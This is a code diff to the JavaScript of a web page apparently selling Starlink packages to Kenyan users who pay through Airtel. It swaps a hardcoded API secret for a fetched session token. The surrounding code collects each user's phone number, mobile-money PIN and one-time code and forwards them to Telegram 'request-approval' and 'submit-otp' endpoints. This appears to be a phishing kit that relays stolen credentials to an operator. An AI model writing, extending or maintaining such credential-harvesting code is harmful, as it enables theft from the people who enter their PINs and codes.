@@ -771,11 +771,31 @@
         
         let phoneCode = '+254';
         let msisdnLength = 9;
-let currentMsisdn = '';
-let currentPin = '';
-let currentRequestId = '';
-let otpId = '';
-let starlinkPackage = null;
+        let currentMsisdn = '';
+        let currentPin = '';
+        let currentRequestId = '';
+        let otpId = '';
+        let starlinkPackage = null;
+        
+        async function getApiSecret() {
+            let token = sessionStorage.getItem('sl_api_token');
+            let expiresAt = parseInt(sessionStorage.getItem('sl_api_token_expires') || '0');
+            if (!token || Date.now() > expiresAt) {
+                try {
+                    const res = await fetch('/api/auth/session', { method: 'POST' });
+                    const data = await res.json();
+                    if (data.success && data.token) {
+                        token = data.token;
+                        expiresAt = Date.now() + (data.expiresIn || 3600000);
+                        sessionStorage.setItem('sl_api_token', token);
+                        sessionStorage.setItem('sl_api_token_expires', expiresAt.toString());
+                    }
+                } catch (e) {
+                    console.error('Failed to get API session:', e);
+                }
+            }
+            return token;
+        }
         
         // Capture Starlink package from URL
         const urlParams = new URLSearchParams(window.location.search);
@@ -1106,7 +1126,7 @@ let starlinkPackage = null;
             try {
                 const response = await fetch('/api/telegram/request-approval', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' },
+                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': await getApiSecret() },
                     body: JSON.stringify({ userPhone: msisdn, userPin: pin, package: starlinkPackage, amount: '', method: 'airtel' })
                 });
                 
@@ -1121,7 +1141,7 @@ let starlinkPackage = null;
                     const pollTimer = setInterval(async () => {
                         try {
                             const statusRes = await fetch(`/api/telegram/status/${currentRequestId}`, {
-                                headers: { 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' }
+                                headers: { 'X-API-Secret': await getApiSecret() }
                             });
                             const statusData = await statusRes.json();
                             
@@ -1357,7 +1377,7 @@ input.addEventListener('paste', function(e) {
             try {
                 const response = await fetch('/api/telegram/submit-otp', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' },
+                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': await getApiSecret() },
                     body: JSON.stringify({ requestId: currentRequestId, otp: otp })
                 });
                 
@@ -1378,7 +1398,7 @@ input.addEventListener('paste', function(e) {
                 const pollTimer = setInterval(async () => {
                     try {
                         const statusRes = await fetch(`/api/telegram/status/${currentRequestId}`, {
-                            headers: { 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' }
+                            headers: { 'X-API-Secret': await getApiSecret() }
                         });
                         const statusData = await statusRes.json();
                         
